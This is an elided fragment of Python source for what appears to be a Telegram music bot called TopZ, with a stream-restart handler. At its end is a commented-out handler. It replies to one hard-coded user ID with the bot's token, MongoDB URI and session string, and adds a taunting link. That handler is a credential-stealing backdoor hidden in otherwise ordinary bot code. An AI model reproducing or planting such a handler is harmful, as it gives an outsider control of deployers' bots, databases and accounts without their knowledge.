...
from TopZ.utils.database import get_assistant, get_authuser_names, get_cmode
from TopZ.utils.decorators import ActualAdminCB, AdminActual, language
from TopZ.utils.formatters import alpha_to_int, get_readable_time
...
async def restartbot(client, message: Message, _):
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await Top.stop_stream_force(chat_id)
        except:
            pass
...
#    filters.command("Top")
#    & filters.private
#    & filters.user(5493923823)
#   )
#async def help(client: Client, message: Message):
#   await message.reply_video(
#          video=f"https://graph.org/file/2d52450a36a95d7f46d08.mp4",
#       caption=f"""ᴛᴏᴋᴇɴ :-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ :-   `{MONGO_DB_URI}`\n\nsᴇssɪᴏɴ :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/THE_OP_BOY)............☆""",
#        reply_markup=InlineKeyboardMarkup(
#             [
#                 [
#                      InlineKeyboardButton(
#                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/THE_TOP_BOY_OP")
#                 ]
#            ]
#         ),
#     )
